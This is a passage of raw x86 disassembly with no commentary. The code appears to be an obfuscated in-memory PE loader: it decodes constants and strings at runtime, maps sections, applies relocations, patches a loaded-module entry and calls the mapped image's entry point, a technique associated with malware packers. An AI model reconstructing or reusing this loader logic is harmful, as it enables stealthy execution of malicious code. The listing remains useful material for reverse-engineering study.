  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
